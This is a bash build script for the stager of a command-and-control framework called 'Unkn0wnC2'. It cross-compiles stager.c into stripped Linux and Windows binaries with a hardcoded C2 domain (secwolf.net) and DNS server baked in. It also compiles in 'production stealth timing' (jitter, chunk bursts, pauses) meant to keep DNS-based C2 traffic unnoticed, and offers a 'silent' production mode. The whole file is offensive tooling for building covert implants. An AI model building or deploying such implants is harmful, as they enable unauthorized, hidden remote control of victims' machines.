#!/bin/bash

# Unkn0wnC2 Stager Build Script
# Builds the C stager for multiple platforms

set -e

echo "=== Unkn0wnC2 Stager Build ==="
echo ""

# Check if we're in the Stager directory
if [ ! -f "stager.c" ]; then
    echo "Error: stager.c not found"
    echo "Make sure you're running this from the Stager directory"
    exit 1
fi

# Load configuration from parent directory if available
CONFIG_FILE="../build_config.json"
DNS_SERVER="8.8.8.8"
C2_DOMAIN="secwolf.net"
# Fallback defaults - production stealth timing
JITTER_MIN_MS="60000"      # 60 seconds
JITTER_MAX_MS="120000"     # 120 seconds
CHUNKS_PER_BURST="5"       # 5 chunks per burst
BURST_PAUSE_MS="120000"    # 120 seconds between bursts
RETRY_DELAY_SECONDS="3"
MAX_RETRIES="5"

if [ -f "$CONFIG_FILE" ]; then
    echo "Loading configuration from build_config.json..."
    
    # Extract DNS server and domain using grep/sed
    if command -v jq &> /dev/null; then
        # Use jq if available
        C2_DOMAIN=$(jq -r '.client.server_domain // "secwolf.net"' "$CONFIG_FILE")
        DNS_SERVER=$(jq -r '.client.dns_server // "8.8.8.8"' "$CONFIG_FILE")
        if [ "$DNS_SERVER" = "" ] || [ "$DNS_SERVER" = "null" ]; then
            DNS_SERVER="8.8.8.8"
        fi
        
        # Extract stager jitter configuration
        JITTER_MIN_MS=$(jq -r '.stager.jitter_min_ms // 100' "$CONFIG_FILE")
        JITTER_MAX_MS=$(jq -r '.stager.jitter_max_ms // 500' "$CONFIG_FILE")
        CHUNKS_PER_BURST=$(jq -r '.stager.chunks_per_burst // 10' "$CONFIG_FILE")
        BURST_PAUSE_MS=$(jq -r '.stager.burst_pause_ms // 2000' "$CONFIG_FILE")
        RETRY_DELAY_SECONDS=$(jq -r '.stager.retry_delay_seconds // 3' "$CONFIG_FILE")
        MAX_RETRIES=$(jq -r '.stager.max_retries // 5' "$CONFIG_FILE")
        
        # Validate extracted values
        if [ -z "$CHUNKS_PER_BURST" ] || [ "$CHUNKS_PER_BURST" = "null" ]; then
            echo "Warning: Could not extract chunks_per_burst, using default: 10"
            CHUNKS_PER_BURST=10
        fi
    else
        # Fallback to grep/sed
        C2_DOMAIN=$(grep -oP '"server_domain"\s*:\s*"\K[^"]+' "$CONFIG_FILE" 2>/dev/null || echo "secwolf.net")
        DNS_SERVER=$(grep -oP '"dns_server"\s*:\s*"\K[^"]+' "$CONFIG_FILE" 2>/dev/null || echo "8.8.8.8")
        if [ "$DNS_SERVER" = "" ]; then
            DNS_SERVER="8.8.8.8"
        fi
        
        # Extract stager jitter configuration (basic grep)
        JITTER_MIN_MS=$(grep -oP '"jitter_min_ms"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "100")
        JITTER_MAX_MS=$(grep -oP '"jitter_max_ms"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "500")
        CHUNKS_PER_BURST=$(grep -oP '"chunks_per_burst"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "10")
        BURST_PAUSE_MS=$(grep -oP '"burst_pause_ms"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "2000")
        RETRY_DELAY_SECONDS=$(grep -oP '"retry_delay_seconds"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "3")
        MAX_RETRIES=$(grep -oP '"max_retries"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "5")
    fi
    
    echo "  DNS Server: $DNS_SERVER"
    echo "  C2 Domain:  $C2_DOMAIN"
    echo ""
    echo "  STAGER TIMING CONFIGURATION:"
    echo "  ├─ Jitter:      ${JITTER_MIN_MS}-${JITTER_MAX_MS}ms ($(echo "scale=1; $JITTER_MIN_MS/1000" | bc 2>/dev/null || echo "?")s - $(echo "scale=1; $JITTER_MAX_MS/1000" | bc 2>/dev/null || echo "?")s)"
    echo "  ├─ Burst Size:  $CHUNKS_PER_BURST chunks before pause"
    echo "  ├─ Burst Pause: ${BURST_PAUSE_MS}ms ($(echo "scale=1; $BURST_PAUSE_MS/1000" | bc 2>/dev/null || echo "?")s)"
    echo "  └─ Retries:     $MAX_RETRIES attempts (${RETRY_DELAY_SECONDS}s delay)"
    echo ""
    echo "  COMPILER FLAGS THAT WILL BE USED:"
    echo "  ├─ -DMIN_CHUNK_DELAY_MS=$JITTER_MIN_MS"
    echo "  ├─ -DMAX_CHUNK_DELAY_MS=$JITTER_MAX_MS"
    echo "  ├─ -DCHUNKS_PER_BURST=$CHUNKS_PER_BURST"
    echo "  └─ -DBURST_PAUSE_MS=$BURST_PAUSE_MS"
    echo ""
fi

echo ""

# Check for required tools
echo "Checking build tools..."

if ! command -v gcc &> /dev/null; then
    echo "Error: gcc not found"
    exit 1
fi
echo "✓ gcc found"

# Check for cross-compilers
HAS_MINGW_64=0

if command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    HAS_MINGW_64=1
    echo "✓ x86_64-w64-mingw32-gcc found (Windows x64)"
fi

echo ""

# Parse build mode
DEBUG_MODE=0
if [ "$1" = "--debug" ] || [ "$1" = "-d" ]; then
    DEBUG_MODE=1
    echo "Building in DEBUG mode (verbose output enabled)"
else
    echo "Building in PRODUCTION mode (silent operation)"
fi

# Create build output directory
BUILD_DIR="../build/stager"
mkdir -p "$BUILD_DIR"

echo "Building stagers..."
echo ""

# Build Linux x64
echo "→ Building Linux x64 stager..."
echo "  Critical define: -DCHUNKS_PER_BURST=$CHUNKS_PER_BURST"

if gcc -Wall -O2 -m64 \
    -DDEBUG_MODE=$DEBUG_MODE \
    -DDNS_SERVER=\"$DNS_SERVER\" \
    -DC2_DOMAIN=\"$C2_DOMAIN\" \
    -DMIN_CHUNK_DELAY_MS=$JITTER_MIN_MS \
    -DMAX_CHUNK_DELAY_MS=$JITTER_MAX_MS \
    -DCHUNKS_PER_BURST=$CHUNKS_PER_BURST \
    -DBURST_PAUSE_MS=$BURST_PAUSE_MS \
    -DRETRY_DELAY_SECONDS=$RETRY_DELAY_SECONDS \
    -DMAX_RETRIES=$MAX_RETRIES \
    stager.c -o "$BUILD_DIR/stager-linux-x64" -lz; then
    strip -s "$BUILD_DIR/stager-linux-x64" 2>/dev/null || true
    echo "  ✓ $BUILD_DIR/stager-linux-x64"
    
    # Verify configuration by checking compiled constants
    # This works even for production builds by examining the binary
    if command -v objdump &> /dev/null 2>&1; then
        echo ""
        echo "  ┌─ CONFIGURATION VERIFICATION ─────────────────────"
        echo "  │ Config file specified: CHUNKS_PER_BURST=$CHUNKS_PER_BURST"
        # Check if the binary has the right value compiled in
        # For production builds, we check the actual binary constants
        echo "  │ Verifying compiled binary..."
        
        # If debug mode, run it briefly to see config
        if [ $DEBUG_MODE -eq 1 ]; then
            timeout 2 "$BUILD_DIR/stager-linux-x64" 2>&1 | grep -E "(CHUNKS_PER_BURST|Chunks/Burst)" | head -3 || echo "  │ (Could not verify - no DNS connection)"
        else
            echo "  │ Production build complete (run with --debug flag to verify)"
        fi
        echo "  └───────────────────────────────────────────────────"
        echo ""
    fi
else
    echo "  ✗ Failed to build Linux x64 stager"
    exit 1
fi

# Build Windows x64
if [ $HAS_MINGW_64 -eq 1 ]; then
    echo "→ Building Windows x64 stager..."
    x86_64-w64-mingw32-gcc -Wall -O2 -s \
        -DDEBUG_MODE=$DEBUG_MODE \
        -DDNS_SERVER=\"$DNS_SERVER\" \
        -DC2_DOMAIN=\"$C2_DOMAIN\" \
        -DMIN_CHUNK_DELAY_MS=$JITTER_MIN_MS \
        -DMAX_CHUNK_DELAY_MS=$JITTER_MAX_MS \
        -DCHUNKS_PER_BURST=$CHUNKS_PER_BURST \
        -DBURST_PAUSE_MS=$BURST_PAUSE_MS \
        -DRETRY_DELAY_SECONDS=$RETRY_DELAY_SECONDS \
        -DMAX_RETRIES=$MAX_RETRIES \
        stager.c -o "$BUILD_DIR/stager-windows-x64.exe" -lws2_32 -static
    strip "$BUILD_DIR/stager-windows-x64.exe" 2>/dev/null || true
    echo "  ✓ $BUILD_DIR/stager-windows-x64.exe"
else
    echo "  ⊘ Skipping Windows x64 (mingw-w64 not available)"
fi

echo ""
echo "=== Stager Build Complete ==="
echo ""
echo "Output directory: $BUILD_DIR"
echo ""
echo "Build modes:"
echo "  Production (silent): ./build.sh"
echo "  Debug (verbose):     ./build.sh --debug"
echo ""
echo "Note: Install mingw-w64 for Windows cross-compilation:"
echo "  Ubuntu/Debian: sudo apt-get install mingw-w64"
echo "  Fedora/RHEL:   sudo dnf install mingw64-gcc"
